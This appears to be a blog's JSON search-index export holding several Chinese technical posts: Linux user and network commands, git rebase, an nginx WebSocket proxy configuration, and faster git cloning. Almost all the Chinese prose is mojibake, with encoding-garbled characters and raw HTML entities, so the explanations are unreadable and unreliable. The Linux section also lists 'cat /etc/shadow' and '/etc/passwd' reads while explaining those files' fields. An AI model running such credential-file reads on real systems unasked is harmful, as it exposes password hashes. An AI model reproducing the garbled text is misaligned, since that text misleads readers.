1gzip test.gz -d &#x2F;&lt;filename&gt; -d å‚æ•°ç”¨äºæŒ‡å®šè§£å‹ä½ç½® æ‚é¡¹å¦‚ä½•æŸ¥çœ‹Linux çš„å‘è¡Œç‰ˆæœ¬ï¼Ÿ 1$ lsb_release -a crontabcrontab å‘½ä»¤è¢«ç”¨æ¥æäº¤å’Œç®¡ç†ç”¨æˆ·çš„éœ€è¦å‘¨æœŸæ€§æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸windowsä¸‹çš„è®¡åˆ’ä»»åŠ¡ç±»ä¼¼ã€‚ wwå‘½ä»¤ç”¨äºæ˜¾ç¤ºå·²ç»ç™»é™†ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨ï¼Œå¹¶æ˜¾ç¤ºç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ ä¸å¸¦ä»»ä½•å‚æ•°ï¼Œä¼šæ˜¾ç¤ºå½“å‰ç™»å…¥ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ· 12345$ w 10:54:39 up 14 days, 22:39, 2 users, load average: 0.18, 0.09, 0.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATwangyh pts&#x2F;0 113.87.129.118 10:27 25:10 2.77s 2.76s topBoo pts&#x2F;1 113.87.129.118 10:54 1.00s 0.00s 0.00s w ç¬¬ä¸€è¡Œæ˜¾ç¤ºçš„å­—æ®µä¿¡æ¯åˆ†åˆ«æ˜¯ï¼š 10:50:39ï¼šç³»ç»Ÿå½“å‰æ—¶é—´ up 2:02ï¼š ç³»ç»Ÿå·²è¿è¡Œæ—¶é—´ 2 userï¼šå½“å‰åœ¨çº¿ç”¨æˆ·ä¸ªæ•° load averageï¼šç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ï¼Œ3ä¸ªæ•°å€¼åˆ†åˆ«å¯¹åº”ç³»ç»Ÿåœ¨è¿‡å»çš„1,5,10åˆ†é’Ÿå†…çš„è´Ÿè½½ç¨‹åº¦ï¼Œæ•°å€¼è¶Šå¤§ï¼Œè¡¨æ˜ç³»ç»Ÿçš„è´Ÿè½½è¶Šå¤§ã€‚ ç¬¬äºŒè¡Œå‡ ä¸ªå­—æ®µåˆ†åˆ«è¡¨ç¤ºï¼š USER ï¼š ç™»é™†ç”¨æˆ·çš„è´¦æˆ·å TTYï¼š ç”¨æˆ·ç™»é™†æ‰€ä½¿ç”¨çš„ç»ˆç«¯ FROMï¼š æ˜¾ç¤ºç”¨æˆ·ä»ä½•å¤„ç™»é™†ï¼Œç”¨æˆ·çš„IPåœ°å€ LOGIN@ï¼šæ˜¾ç¤ºç”¨æˆ·ç™»é™†å…¥ç³»ç»Ÿæ—¶çš„æ—¶é—´ IDLEï¼šç”¨æˆ·ç©ºé—²æ—¶é•¿ï¼Œä»ä¸Šä¸€æ¬¡è¯¥ç”¨æˆ·çš„ä»»åŠ¡ç»“æŸåå¼€å§‹è®¡æ—¶ï¼Œä»¥hourä¸ºå•ä½ JCPUï¼šè¡¨ç¤ºåœ¨æŸæ®µæ—¶é—´å†…ï¼Œå½“å‰ç”¨æˆ·æ‰€æœ‰çš„è¿›ç¨‹ä»»åŠ¡æ‰€æ¶ˆè€—çš„CPUæ—¶é—´ PCPUï¼šè¡¨ç¤ºåœ¨æŸæ®µæ—¶é—´å†…ï¼Œå½“å‰ç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ä»»åŠ¡æ‰€æ¶ˆè€—çš„CPUæ—¶é—´ WHATï¼šè¡¨ç¤ºç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ whowho å‘½ä»¤ç”¨äºæŸ¥çœ‹ç›®å‰ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¸wå‘½ä»¤ç±»ä¼¼ã€‚ æ˜¾ç¤ºå½“å‰ç™»å…¥ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ 123$ whowangyh pts&#x2F;0 2019-04-19 10:27 (113.87.129.118)Boo pts&#x2F;1 2019-04-19 10:54 (113.87.129.118) å¸¸ç”¨å‚æ•°-mï¼šæ•ˆæœç­‰åŒäºæ‰§è¡Œwhoamiå‘½ä»¤-qæˆ–--countï¼šåªæ˜¾ç¤ºç™»å…¥ç³»ç»Ÿçš„å¸å·åç§°å’Œæ€»äººæ•°ï¼›-Hï¼šå¢åŠ æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯çŠ¶æ€æ  lastlast å‘½ä»¤ç”¨äºæŸ¥çœ‹ç”¨æˆ·æœ€è¿‘çš„ç™»å…¥ä¿¡æ¯ è¾“å‡ºæœ€å10 æ¡ç™»å…¥ä¿¡æ¯ 1234$ last -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inwangyh pts&#x2F;0 113.87.129.118 Fri Apr 19 10:27 still logged inwangyh pts&#x2F;5 113.87.129.118 Fri Apr 19 10:24 - 10:27 (00:02) æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„ç™»å…¥ä¿¡æ¯ 1234$ last Boo -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inBoo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:23 - 10:26 (00:03)Boo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:14 - 10:22 (00:08) pkillpkillå‘½ä»¤å¯ä»¥æŒ‰ç…§è¿›ç¨‹åæ€æ­»è¿›ç¨‹ï¼Œå¯ä»¥ç”¨äºè¸¢å‡ºå½“å‰ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ã€‚ å®‰å…¨çš„è¸¢å‡ºç”¨æˆ·å¯ä»¥ä½¿ç”¨pkillå‘½ä»¤è¸¢å‡ºå½“å‰æ­£ç™»å…¥ç³»ç»Ÿä¸­çš„ç”¨æˆ·ï¼Œä½†æ˜¯è¿™ä¹ˆåšå¾ˆå±é™©ï¼Œæ›´å¥½çš„è§£å†³åŠæ³•æ˜¯ï¼šå…ˆæŸ¥çœ‹ç»ˆç«¯å·ï¼Œç„¶åæŸ¥çœ‹è¯¥ç»ˆç«¯æ‰§è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼Œæ ¹æ®è¿›ç¨‹å·æ¥åœæ­¢æœåŠ¡ã€‚ 12$ ps -ef| grep pts&#x2F;0$ kill -9 pid passwdpasswd å‘½ä»¤ç”¨äºè®¾ç½®ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·å¯†ç ã€å¯†ç è¿‡æœŸæ—¶é—´ç­‰ã€‚ ç³»ç»Ÿç®¡ç†è€…åˆ™èƒ½ç”¨å®ƒç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„å¯†ç ã€‚åªæœ‰ç®¡ç†è€…å¯ä»¥æŒ‡å®šç”¨æˆ·åç§°ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½å˜æ›´è‡ªå·±çš„å¯†ç ã€‚ ssss å‘½ä»¤ç”¨æ¥æ˜¾ç¤ºå¤„äºæ´»åŠ¨çŠ¶æ€çš„å¥—æ¥å­—ä¿¡æ¯ã€‚ss å‘½ä»¤å¯ä»¥ç”¨æ¥è·å–socket ç»Ÿè®¡ä¿¡æ¯ï¼Œå®ƒå¯ä»¥æ˜¾ç¤ºå’Œnetstat ç±»ä¼¼çš„å†…å®¹ã€‚ä½†ss çš„ä¼˜åŠ¿åœ¨äºå®ƒèƒ½å¤Ÿæ˜¾ç¤ºæ›´å¤šæ›´è¯¦ç»†çš„æœ‰å…³TCP å’Œè¿æ¥çŠ¶æ€çš„ä¿¡æ¯ï¼Œè€Œä¸”æ¯”netstat æ›´å¿«é€Ÿæ›´é«˜æ•ˆã€‚ æ˜¾ç¤ºæ‰€æœ‰çš„tcp å¥—æ¥å­— 1$ ss -t -a æ˜¾ç¤ºSocket æ‘˜è¦ 1$ ss -s åˆ—å‡ºæ‰€æœ‰æ‰“å¼€çš„ç½‘ç»œè¿æ¥ç«¯å£ 1$ ss -l æ‰¾å‡ºæ‰“å¼€å¥—æ¥å­—/ç«¯å£åº”ç”¨ç¨‹åº 1$ ss -pl | grep 6666 çŸ¥è¯†æ‰©å±•å­˜æ”¾ç”¨æˆ·ä¿¡æ¯ï¼š 12$ cat &#x2F;etc&#x2F;passwd$ cat &#x2F;etc&#x2F;shadow ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶åˆ†æï¼ˆæ¯é¡¹ç”¨:éš”å¼€ï¼‰ï¼š 12345678jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bashjack &#x2F;&#x2F;ç”¨æˆ·åX &#x2F;&#x2F;å£ä»¤ã€å¯†ç 503 &#x2F;&#x2F;ç”¨æˆ·idï¼ˆ0ä»£è¡¨rootã€æ™®é€šæ–°å»ºç”¨æˆ·ä»500å¼€å§‹ï¼‰504 &#x2F;&#x2F;æ‰€åœ¨ç»„: &#x2F;&#x2F;æè¿°&#x2F;home&#x2F;jack&#x2F; &#x2F;&#x2F;ç”¨æˆ·ä¸»ç›®å½•&#x2F;bin&#x2F;bash &#x2F;&#x2F;ç”¨æˆ·ç¼ºçœShell å­˜æ”¾ç»„ä¿¡æ¯ï¼š 12cat &#x2F;etc&#x2F;groupcat &#x2F;etc&#x2F;gshadow ç”¨æˆ·ç»„ä¿¡æ¯æ–‡ä»¶åˆ†æï¼š 123456789jack:$!$:???:13801:0:99999:7:*:*:jack &#x2F;&#x2F;ç»„å$!$ &#x2F;&#x2F;è¢«åŠ å¯†çš„å£ä»¤13801 &#x2F;&#x2F;åˆ›å»ºæ—¥æœŸä¸ä»Šå¤©ç›¸éš”çš„å¤©æ•°0 &#x2F;&#x2F;å£ä»¤æœ€çŸ­ä½æ•°99999 &#x2F;&#x2F;ç”¨æˆ·å£ä»¤7 &#x2F;&#x2F;åˆ°7å¤©æ—¶æé†’* &#x2F;&#x2F;ç¦ç”¨å¤©æ•°* &#x2F;&#x2F;è¿‡æœŸå¤©æ•° å¦‚æœæ˜¯æ™®é€šç”¨æˆ·æ‰§è¡Œpasswdåªèƒ½ä¿®æ”¹è‡ªå·±çš„å¯†ç ã€‚å¦‚æœæ–°å»ºç”¨æˆ·åï¼Œè¦ä¸ºæ–°ç”¨æˆ·åˆ›å»ºå¯†ç ï¼Œåˆ™ç”¨passwdç”¨æˆ·åï¼Œæ³¨æ„è¦ä»¥rootç”¨æˆ·çš„æƒé™æ¥åˆ›å»ºã€‚ 12# ä¿®æ”¹boo ç”¨æˆ·çš„å¯†ç $ passwd boo å‚è€ƒé“¾æ¥ï¼š Wget å‘½ä»¤ SCP å‘½ä»¤ last å‘½ä»¤ who å‘½ä»¤ pkill å‘½ä»¤ ss å‘½ä»¤ permission denied,please try again","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"}]},{"title":"Git å˜åŸºå‘½ä»¤è¯¦è§£","slug":"detailed-explanation-of-git-rebase-commands","date":"2020-08-24T12:06:20.000Z","updated":"2020-08-25T12:10:32.469Z","comments":true,"path":"detailed-explanation-of-git-rebase-commands/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/","excerpt":"â€œå˜åŸºâ€å‘½ä»¤æ˜¯git å¸¸ç”¨å‘½ä»¤ä¸­ï¼Œæ¯”è¾ƒå†·é—¨çš„ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤æ¯”è¾ƒâ€œå±é™©â€ï¼Œå¦‚æœç”¨ä¸å¥½ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ä»£ç ä¸¢å¤±ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤ä¸åƒ addã€commitã€pullã€push å±äºå¿…é¡»è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå°±ç®—ä¸ç”¨å®ƒï¼Œä¹Ÿèƒ½å¹²æ´»ã€‚","text":"â€œå˜åŸºâ€å‘½ä»¤æ˜¯git å¸¸ç”¨å‘½ä»¤ä¸­ï¼Œæ¯”è¾ƒå†·é—¨çš„ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤æ¯”è¾ƒâ€œå±é™©â€ï¼Œå¦‚æœç”¨ä¸å¥½ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ä»£ç ä¸¢å¤±ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºè¿™ä¸ªå‘½ä»¤ä¸åƒ addã€commitã€pullã€push å±äºå¿…é¡»è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå°±ç®—ä¸ç”¨å®ƒï¼Œä¹Ÿèƒ½å¹²æ´»ã€‚ åœºæ™¯é‡ç°é—®é¢˜æè¿°ï¼šæœ‰æ—¶å€™æˆ‘ä»¬åœ¨æœ¬åœ°æäº¤å®Œä»£ç ï¼Œä¸‹ä¸€ä¸ªæ“ä½œæ˜¯éœ€è¦æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼Œè¿™æ—¶å¦‚æœè¿œç¨‹ä»“åº“å·²ç»æœ‰äº†æ›´æ–°çš„æäº¤ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æ‰§è¡Œå®Œgit push å‘½ä»¤ä¹‹åï¼Œä¸å‡ºæ„å¤–ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š 1234567! [rejected] master -&gt; master (fetch first)error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &#39;git pull ...&#39;) before pushing again.hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details. è¿™æ—¶é”™è¯¯çš„æ„æ€æ˜¯ï¼šæ¨é€å¤±è´¥ï¼Œä½ éœ€è¦å…ˆå°†è¿œç¨‹ä»“åº“æœ€æ–°çš„æäº¤æ›´æ–°åˆ°æœ¬åœ°ä»“åº“ï¼Œç„¶åæ‰èƒ½ git pushã€‚ æ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½ æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š ä½¿ç”¨git pull è‡ªåŠ¨åˆå¹¶ ä½¿ç”¨git fetch æ‰‹åŠ¨åˆå¹¶ å‰è€…è™½ç„¶ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯è‡ªåŠ¨åˆå¹¶ä¼šç•™ä¸‹ä¸€æ¬¡åˆå¹¶è®°å½•ï¼Œç±»ä¼¼è¿™æ ·ï¼š 1Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home è™½ç„¶è¿™å¹¶ä¸ä¼šå½±å“ä»€ä¹ˆï¼Œä½†å¦‚æœä½ å¾ˆé‡è§† commit logsï¼Œé‚£ä¹ˆè¿™æ ·çš„ä¸€æ¬¡è®°å½•ï¼Œæ˜¯ä¸è¢«å®¹å¿çš„ã€‚ åè€…é€šè¿‡æ‰‹åŠ¨åˆå¹¶ï¼Œç¡®å®å¯ä»¥åšåˆ°æ²¡æœ‰å¤šä½™çš„åˆå¹¶è®°å½•ï¼Œä½†æ˜¯æ¯æ¬¡æ‰‹åŠ¨åˆå¹¶æœ‰æ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆæŠ˜ä¸­çš„æ–¹å¼ï¼Œæ—¢å¯ä»¥ä¸ç•™ä¸‹å¤šä½™çš„è®°å½•ï¼Œæœ‰æ¯”è¾ƒçœäº‹ã€‚ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬ä¸‹é¢è¦ä»‹ç»çš„â€œå˜åŸºâ€ã€‚ rebaseä¸‹é¢è¿™æ¡å‘½ä»¤ä¼šå°†è¿œç¨‹ä»“åº“ä¸­æœ€æ–°çš„æäº¤åˆå¹¶åˆ°æœ¬åœ°ä»“åº“ï¼Œ--rebaseå‚æ•°çš„ä½œç”¨æ˜¯å…ˆå–æ¶ˆ commit è®°å½•ï¼Œå¹¶æŠŠå®ƒä»¬ä¸´æ—¶ä¿å­˜ä¸ºè¡¥ä¸ï¼ˆpatchï¼‰ï¼Œè¿™äº›è¡¥ä¸æ”¾åœ¨ .git/rebaseç›®å½•ä¸­ï¼Œç­‰è¿œç¨‹ä»“åº“åŒæ­¥è‡³æœ¬åœ°ä¹‹åï¼Œæœ€åæ‰å°†è¡¥ä¸åˆå¹¶åˆ°æœ¬åœ°ä»“åº“ã€‚ 1git pull --rebase origin master ä¸‹é¢ç”¨å›¾æ¥è§£é‡Šå…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆã€‚ git pull ä¹‹å‰çš„æƒ…å†µï¼š ä½¿ç”¨ git pull --rebase originï¼š æœ€åä½¿ç”¨ git pushï¼š æ€»ç»“å¦‚æœä½ å¯¹ commit logsæœ‰å¼ºçƒˆçš„æ§åˆ¶æ¬²æœ›ï¼Œé‚£ä¹ˆå˜åŸºå‘½ä»¤æ˜¯é€‚åˆä½ çš„ï¼Œå¦‚æœä½ æ˜¯ä½¿ç”¨git çš„æ–°æ‰‹ï¼Œæˆ–è€…ä½ ä¸åœ¨æ„ commit logsï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨ git pull è‡ªåŠ¨åˆå¹¶å°±å¥½äº†ã€‚ å‚è€ƒé“¾æ¥ git pushé”™è¯¯failed to push some refs toçš„è§£å†³","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Socket.io è¿æ¥å¼‚å¸¸ï¼šError during WebSocket handshake Unexpected response code 400","slug":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400","date":"2020-08-23T02:34:50.000Z","updated":"2020-08-23T02:43:00.235Z","comments":true,"path":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","link":"","permalink":"https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","excerpt":"å‰æ®µæ—¶é—´çº¿ä¸Šçš„ç”Ÿäº§ç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šError during WebSocket handshake: Unexpected response code: 400ã€‚ èµ·åˆæˆ‘æ²¡å¤ªåœ¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯æ­£å¸¸çš„ socket.io è¿æ¥æ–­å¼€äº†ã€‚ ç›´åˆ°æˆ‘å‘ç° socker.io çš„é€šè®¯æ–¹å¼ç”±åŸæ¥çš„åœ¨ä¸€ä¸ªè¿æ¥ä¸­é€šè®¯å˜æˆäº†æ¯ä¸€æ¬¡æ¨é€éƒ½é‡èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œæˆ‘æ‰æ„è¯†åˆ°å¯èƒ½æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚","text":"å‰æ®µæ—¶é—´çº¿ä¸Šçš„ç”Ÿäº§ç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šError during WebSocket handshake: Unexpected response code: 400ã€‚ èµ·åˆæˆ‘æ²¡å¤ªåœ¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯æ­£å¸¸çš„ socket.io è¿æ¥æ–­å¼€äº†ã€‚ ç›´åˆ°æˆ‘å‘ç° socker.io çš„é€šè®¯æ–¹å¼ç”±åŸæ¥çš„åœ¨ä¸€ä¸ªè¿æ¥ä¸­é€šè®¯å˜æˆäº†æ¯ä¸€æ¬¡æ¨é€éƒ½é‡èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œæˆ‘æ‰æ„è¯†åˆ°å¯èƒ½æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚ nginx ä½œä¸ºwbsocket ä»£ç†ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾ï¼Œäº†è§£åˆ° nginx åœ¨ä½œä¸ºåå‘ä»£ç†æ—¶ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨ wssï¼Œé‚£ä¹ˆè¿˜éœ€è¦é¢å¤–åŠ ä¸€æ®µé…ç½®ã€‚ NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly. â€”â€” Nginx å®˜ç½‘ ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šnginx é€šè¿‡å…è®¸åœ¨å®¢æˆ·ç«¯å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´å»ºç«‹è¿æ¥æ¥æ”¯æŒ websocket é€šè®¯ï¼Œä¸ºäº†ä½¿ nginx å°†å‡çº§è¯·æ±‚ä»å®¢æˆ·ç«¯å‘é€åˆ°åç«¯æœåŠ¡å™¨ï¼Œå¿…é¡»æ˜ç¡®è®¾ç½® Upgrade å’Œ Connection æ ‡å¤´ã€‚ 12345678location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;wsbackend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header Host $host;&#125; ç¬¬ä¸€è¡Œæ˜¯ nginx åå‘ä»£ç†çš„é…ç½®ï¼Œåé¢å››è¡Œæ‰æ˜¯è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚ ä»”ç»†æƒ³ä¸€æƒ³ï¼Œå› ä¸ºæœ¬åœ°æ²¡æœ‰ https çš„æ¦‚å¿µï¼Œå¹¶æ²¡æœ‰å‘ç°è¿™ä¸ªé—®é¢˜ï¼Œè€Œçº¿ä¸Šæ˜¯æœ‰é…ç½®è¯ä¹¦çš„ï¼Œæ‰€ä»¥æš´éœ²å‡ºäº†è¿™ä¸ªé—®é¢˜ã€‚ æ€»ç»“socket.io çš„è¯·æ±‚å¹¶æ²¡æœ‰çœŸæ­£è¾¾åˆ°ï¼Œè¯·æ±‚å‘å‡ºä¹‹åä¸­é—´ä¸ºä»€ä¹ˆæ²¡æœ‰åˆ°è¾¾èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚ ä¸ºäº†ä½¿ nginx æ­£ç¡®å¤„ç† socket.io æ‰€éœ€è¦åšçš„å°±æ˜¯æ­£ç¡®è®¾ç½®æ ‡å¤´ï¼Œä»¥å¤„ç†å°†è¿æ¥ä» http å‡çº§åˆ° websocket çš„è¯·æ±‚ã€‚ å‚è€ƒé“¾æ¥ Nginx ä½œä¸ºWebsocket åå‘ä»£ç†","categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"}]},{"title":"Git Clone å¤ªæ…¢æ€ä¹ˆåŠï¼Ÿ","slug":"what-should-I-do-if-git-clone-is-too-slow","date":"2020-08-19T14:29:15.000Z","updated":"2020-09-08T01:31:21.124Z","comments":true,"path":"what-should-I-do-if-git-clone-is-too-slow/","link":"","permalink":"https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/","excerpt":"","text":"å‰è¨€æœ€è¿‘åœ¨ä½¿ç”¨git æ—¶ï¼Œéœ€è¦å…‹éš†Bitbucketçš„ä¸€ä¸ªä»“åº“ï¼Œäºæ˜¯åƒå¾€å¸¸ä¸€æ ·æ‰“å¼€äº†iTermï¼Œä¾¿æ”¾åœ¨ä¸€è¾¹äº†ã€‚ç›´åˆ°ä¸€ä¸ªå°æ—¶åï¼Œæˆ‘æ‰æƒ³èµ·æ¥ï¼Œæƒ³ç€åº”è¯¥å…‹éš†å®Œäº†ï¼Œæ‰“å¼€æ‰å‘ç°ç™¾åˆ†ä¹‹ä¸€éƒ½æ²¡ä¸‹è½½å®Œã€‚ å¼ºå¤§çš„é•¿åŸæŠ€æœ¯å¯¹GitHubã€Bitbucket è¿™ç±»æºä»£ç æ‰˜ç®¡æœåŠ¡å¹³å°ç½‘å¼€ä¸€é¢ï¼Œå¹¶æ²¡æœ‰åƒGoogleã€FaceBooké‚£æ ·ç›´æ¥ä¸€åˆ€åˆ‡ï¼Œä½†æ˜¯å®ƒåšäº†ä¸¥æ ¼çš„é™é€Ÿï¼Œè¿™ç§æŠ˜ç£¨ç®€ç›´æ¯”æ— æ³•è®¿é—®æ›´éš¾å—ã€‚ ä¸Šå›¾ä¸­git cloneçš„é€Ÿåº¦ä»æ¥æ²¡æœ‰è¶…è¿‡ 10k/sï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ä¸€ä¸ª 100M çš„é¡¹ç›®ï¼Œéœ€è¦è¿‘ä¸‰ä¸ªå°æ—¶æ‰èƒ½ä¸‹è½½å®Œï¼Œè€Œä¸”ç”±äºç½‘ç»œçš„ä¸ç¨³å®šæ€§ï¼Œä¸‹è½½è¿‡ç¨‹ä¸­å¶å°”ä¼šå‡ºç°æ–­å¼€è¿æ¥çš„æƒ…å†µï¼Œç”±äºgit clone ä¸æ”¯æŒç«¯ç‚¹ç»­ä¼ ï¼Œè¿™å°±ä¼šå¯¼è‡´å‰å‡ ä¸ªå°æ—¶çš„ä¸‹è½½é‡å®Œå…¨æµªè´¹æ‰äº†ï¼Œåªèƒ½é‡æ–°å¼€å§‹ä¸‹è½½ã€‚ è¿™ç¯‡æ–‡ç« ä¸»è¦ç”¨æ¥ä»‹ç»å‡ ç§æ–¹å¼å¯ä»¥å¿«é€Ÿçš„å…‹éš†è¿œç¨‹ä»“åº“ã€‚ æµ…å¤åˆ¶git cloneé»˜è®¤ä¼šä¸‹è½½é¡¹ç›®çš„å®Œæ•´å†å²ç‰ˆæœ¬ï¼Œå¦‚æœä½ åªå…³å¿ƒä»£ç ï¼Œè€Œä¸å…³å¿ƒå†å²ä¿¡æ¯ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ git çš„æµ…å¤åˆ¶åŠŸèƒ½ï¼š 1$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git --depth=1 è¡¨ç¤ºåªä¸‹è½½æœ€è¿‘ä¸€æ¬¡çš„ç‰ˆæœ¬ï¼Œä½¿ç”¨æµ…å¤åˆ¶å¯ä»¥å¤§å¤§å‡å°‘ä¸‹è½½çš„æ•°æ®é‡ï¼Œä¾‹å¦‚ï¼ŒCodeIgniter é¡¹ç›®å®Œæ•´ä¸‹è½½æœ‰è¿‘ 100MiB ï¼Œè€Œä½¿ç”¨æµ…å¤åˆ¶åªæœ‰ 5MiB å¤šï¼Œè¿™æ ·å³ä½¿åœ¨æ¶åŠ£çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¹Ÿå¯ä»¥å¿«é€Ÿçš„è·å¾—ä»£ç ã€‚ å¦‚æœä¹‹ååˆæƒ³è·å–å®Œæ•´å†å²ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š 1$ git fetch --unshallow æˆ–è€…ï¼Œå¦‚æœä½ åªæƒ³ä¸‹è½½æœ€æ–°çš„ä»£ç ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥ä»è¿œç¨‹ä»“åº“ä¸‹è½½æ‰“åŒ…å¥½çš„zipæ–‡ä»¶ï¼Œè¿™ä¼šæ¯”æµ…å¤åˆ¶æ›´å¿«ï¼Œå› ä¸ºå®ƒåªåŒ…å«äº†æœ€æ–°çš„ä»£ç æ–‡ä»¶ï¼Œè€Œä¸”zipæ˜¯å‹ç¼©æ–‡ä»¶ã€‚ä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œä½¿ç”¨æµ…å¤åˆ¶ä¼šçµæ´»ä¸€äº›ã€‚ GUI å·¥å…·å¦‚æœä½ æœ‰å¹¸æ­£åœ¨ä½¿ç”¨ä»£ç†ï¼Œæ‡‚å¾—å¦‚ä½•ç§‘å­¦ä¸Šç½‘çš„è¯ï¼Œé‚£ä¹ˆè®¿é—®GitHubã€Bitbucketå¯¹ä½ æ¥è¯´åº”è¯¥ä¸åœ¨è¯ä¸‹ã€‚ ä»æºä»£ç æ‰˜ç®¡æœåŠ¡å¹³å°ä¸‹è½½é¡¹ç›®æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¸€æ¬¾å›¾å½¢åŒ–ç•Œé¢ï¼ˆGUIï¼‰çš„Gitå·¥å…·ã€‚ ä½¿ç”¨GUIå·¥å…·æ–¹ä¾¿ä¹‹å¤„å°±åœ¨äºï¼Œå¯ä»¥åœ¨è®¾ç½®ä¸­ç›´æ¥é…ç½®æ˜¯å¦ä½¿ç”¨ä»£ç†ã€‚æˆ–è€…ç›´æ¥å°†ä»£ç†é…ç½®å°¾ç³»ç»Ÿä»£ç†ã€‚ http/https 